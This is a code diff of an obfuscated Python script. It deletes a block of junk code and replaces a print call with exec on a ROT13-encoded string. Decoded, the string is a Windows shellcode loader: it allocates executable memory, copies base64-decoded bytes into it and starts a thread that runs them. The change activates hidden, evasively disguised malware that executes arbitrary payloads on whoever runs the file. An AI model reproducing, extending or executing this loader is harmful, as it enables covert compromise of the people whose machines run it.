@@ -7,11 +7,6 @@
 import ctypes
 import base64
 
-# 垃圾代码块
-for _ in range(ord('@')):
-    if (lambda x: x ** 2)(_) % 3 == 0:
-        _ = str(_) * int(bin(0o777)[2:])
-
 
 def _0xr0t13(_0xmsg):
     _0xresult = []
@@ -31,4 +26,4 @@ s = base64.b64decode(_0xdeadc0de)
 
 _0xc0d3d = "pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(f), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(f), yra(f));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)"
 
-print(_0xr0t13(_0xc0d3d))
+exec(_0xr0t13(_0xc0d3d))
